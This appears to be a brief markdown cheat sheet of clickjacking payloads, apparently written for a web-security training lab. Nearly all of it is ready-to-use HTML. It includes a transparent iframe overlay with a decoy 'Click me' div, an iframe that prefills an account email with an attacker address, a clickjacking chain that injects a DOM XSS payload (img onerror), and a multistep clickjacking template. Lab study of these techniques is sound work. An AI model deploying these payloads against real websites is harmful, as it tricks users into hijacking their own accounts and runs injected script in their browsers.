## basic attack

change **opacity + width + height** values as you wish: 
```html
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```

## prefilled form 

```html
`<iframe src="https://vulnerable-website.com/my-account?email=hacker@attacker-website.com"></iframe>`
```

---
# chain
## clickjacking + DOM XSS 

```html
<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

## Multistep clickjacking

```html
<style>
  	iframe {
  		position:relative;
  		width:$width_value;
  		height: $height_value;
  		opacity: $opacity;
  		z-index: 2;
  	}
     .firstClick, .secondClick {
  		position:absolute;
  		top:$top_value1;
  		left:$side_value1;
  		z-index: 1;
  	}
     .secondClick {
  		top:$top_value2;
  		left:$side_value2;
  	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>

```